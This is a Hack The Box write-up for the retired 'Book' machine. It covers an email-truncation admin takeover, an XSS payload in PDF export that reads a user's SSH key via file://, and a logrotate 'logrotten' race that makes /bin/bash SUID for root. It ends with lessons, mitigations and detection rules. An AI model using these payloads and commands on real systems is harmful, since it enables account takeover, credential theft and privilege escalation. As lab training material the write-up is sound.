# Book — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

A PHP library application with open registration. The form limits the email to 20 characters, exactly like the MySQL column: sending `admin@book.htb` plus padding creates a second account that collides with the administrator's and logs into `/admin/`. From the panel a PDF is generated by a renderer that executes JavaScript, so a title carrying XSS reads `reader`'s SSH key through `file:///`. As `reader`, a root `logrotate` rotates a log the user owns with the `create` option; the `logrotten` race writes into `/etc/bash_completion.d/` and root's next local login runs the payload.

## Recon

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 22,80 -sCV -oA nmap_svc <IP>
```

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
```

- Only SSH and HTTP; the rest of the stack is PHP with MySQL behind it.
- The session cookie is issued without `HttpOnly`, which is not used in the chain but confirms a classic PHP application.
- The landing title names the service: a library with books, collections and PDF export.

```bash
printf '%s\n' '<IP> book.htb' | sudo tee -a /etc/hosts
```

## Enumeration

Registration is open and the contact page leaks the `admin@book.htb` account. A directory sweep finds `/admin/`, `/collections.php`, `/search.php` and `/feedback.php`.

The form fields enforce limits in JavaScript (`name` 10, `email` 20) that are repeated in the database. That coincidence is the clue: MySQL truncates the value to the column size and `PAD SPACE` collations ignore trailing spaces, so two different emails can end up as the same one.

## Foothold

Register an account whose email is the administrator's plus padding:

```bash
curl -s -X POST http://book.htb/index.php \
  -d 'name=admin' \
  -d 'email=admin@book.htb++++++++++a' \
  -d 'password=<PASSWORD>'
```

The row is inserted truncated to 20 characters, that is `admin@book.htb`, and logging in at `/admin/index.php` with that password opens the panel. A root cleanup job deletes the duplicate row after about a minute, so use it immediately; the administrator's original password is not overwritten.

The panel creates books and exports the collection as a PDF. The generator executes content JavaScript, so a title with this payload reads a local file into the PDF:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script>
```

Requesting the export (`/admin/collections.php?type=collections`) returns the PDF with `reader`'s private key:

```bash
chmod 400 id_rsa
ssh -i id_rsa reader@book.htb
```

Why it works: the renderer is an unisolated browser resolving `file://` with the privileges of the process generating the PDF, so the content XSS becomes arbitrary file read on the server.

## Lateral movement

There is no second host. The hop is from `www-data` (the PDF context) to `reader` through the SSH key read from disk, the only interactive account besides `root`.

## Privilege escalation

`pspy` shows a root `logrotate` every few seconds over `/root/log.cfg`, and the log it rotates belongs to `reader`:

```text
CMD: UID=0 | /usr/sbin/logrotate -f /root/log.cfg
CMD: UID=0 | /bin/sh /root/log.sh
```

The configuration includes `create`, the condition the race needs: `logrotate` renames the log directory and creates a new one following a symlink placed in time.

```bash
logrotate --version        # 3.11.0
gcc -o logrotten logrotten.c

printf '#!/bin/sh\nchmod u+s /bin/bash\n' > payload
head -c 10M < /dev/urandom > /home/reader/backups/access.log
./logrotten -p ./payload /home/reader/backups/access.log
```

`logrotten` swaps `/home/reader/backups` for a symlink to `/etc/bash_completion.d/`; when root rotates the log with `create`, the resulting file lands in that directory owned by `reader`. The trigger is root's local login, run by an `expect` script every minute that loads the completions:

```bash
ls -l /etc/bash_completion.d/
bash -p
id                         # uid=0(root)
```

## Evidence

- Registration response and the duplicate row in the panel, without passwords.
- Exported PDF with the key truncated.
- `pspy` output showing root's `logrotate`.
- `ls -l /etc/bash_completion.d/` with the file created by the race.
- No flags or real credentials.

## Lessons learned

- Client-side and database length limits must be backed by server validation; otherwise truncation creates identity collisions.
- A PDF generator that runs JavaScript is a browser with filesystem access: treat it as XSS with local file read impact.
- A user-owned log inside a writable directory, rotated by root with `create`, is an exploitable race even with no `logrotate` CVE.
- The duplicate account lived for about a minute: read `pspy`/cron before assuming the flaw "does not work".
- `bash -p` keeps the SUID privileges; without `-p`, bash drops them.

## Mitigations and detection

- Validate email length and format server-side, and enforce a `UNIQUE` constraint on the full value, not on a truncated column.
- Run PDF generation in a container with no filesystem access and JavaScript disabled; sanitise input HTML.
- Do not rotate user logs with `create` from a root process; use `su`/`copytruncate` and root-owned directories.
- Detection: duplicate signups for the same email in the users table; requests to `collections.php?type=collections` right after creating a book with `<script>`; `logrotate` with `create` over user paths; writes to `/etc/bash_completion.d/` (auditd `-w /etc/bash_completion.d -p wa`).
